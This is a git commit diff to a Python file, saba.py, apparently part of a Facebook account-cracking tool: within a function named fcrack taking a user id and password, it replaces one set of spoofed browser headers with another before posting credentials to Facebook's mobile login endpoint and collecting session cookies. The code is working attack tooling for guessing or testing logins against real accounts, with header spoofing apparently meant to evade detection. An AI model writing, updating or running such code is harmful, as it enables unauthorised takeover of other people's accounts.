df3db8916219256c3832da5b411ddaccec04ac2f
MrHaker90 <134221558+MrHaker90@users.noreply.github.com>
2023-05-23 18:53:54 +0500

    Update saba.py

--- saba.py
+++ saba.py
@@ -1467,41 +1467,41 @@ def fcrack(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority': 'm.facebook.com',
 
-			'upgrade-insecure-requests': '1',
-
-			'viewport-width': '980',
-
-			'method': 'path',
+            'method': 'path',
 
 			'scheme': 'https',
-
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-
-			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
-
-			'dnt':'1', 
-
-			'x-requested-with':'mark.via.gp', 
-
-			'sec-fetch-site': 'none',
-
-			'sec-fetch-mode': 'navigate',
-
-			'sec-fetch-user': '?1',
-
-			'sec-fetch-dest': 'document',
-
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-
-			'cache-control': 'max-age=0',
-
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
-
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-
-			"sec-ch-prefers-color-scheme": "light",
-
-			'user-agent': pro}
+			
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            
+            'accept-language': 'en-US,en;q=0.9',
+            
+            'cache-control': 'max-age=0',
+            
+            'sec-ch-prefers-color-scheme': 'light',
+            
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
+            
+            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5625.195", "Google Chrome";v="113.0.5625.195"',
+            
+            'sec-ch-ua-mobile': '?0',
+            
+            'sec-ch-ua-platform': '"Linux"',
+            
+            'sec-ch-ua-platform-version': '""',
+            
+            'sec-fetch-dest': 'document',
+            
+            'sec-fetch-mode': 'navigate',
+            
+            'sec-fetch-site': 'none',
+            
+            'sec-fetch-user': '?1',
+            
+            'upgrade-insecure-requests': '1',
+            
+            'user-agent': 'Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5625.195 Safari/537.36',
+            
+            'viewport-width': '980',}
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
